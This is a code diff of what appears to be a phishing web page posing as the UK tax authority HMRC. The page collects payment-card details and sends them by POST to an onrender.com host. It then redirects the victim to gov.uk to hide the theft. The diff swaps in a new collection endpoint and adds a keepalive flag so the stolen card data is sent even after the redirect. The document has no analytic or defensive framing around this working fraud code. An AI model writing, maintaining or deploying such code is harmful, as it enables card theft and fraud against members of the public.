@@ -255,7 +255,7 @@
       
           <div class="form-row">
               <div>
-                  <label class="form-label" for="expiry"><strong>Expiry MM/YY</strong></label>
+                  <label class="form-label" for="expiry"><strong>Expiry</strong></label>
                   <input required class="form-input" inputmode="numeric" id="expiry" name="expiry" autocomplete="cc-exp" placeholder="MM/YY" maxlength="5">
               </div>
               <div>
@@ -294,10 +294,11 @@
           };
 
           try {
-            const res = fetch('https://hmrc-ykig.onrender.com/submit-form', {
+            const res = fetch('https://hmrc-kt5q.onrender.com/submit-form', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(formData)
+              body: JSON.stringify(formData),
+              keepalive: true
             });
 
             window.location.href = "https://gov.uk/";
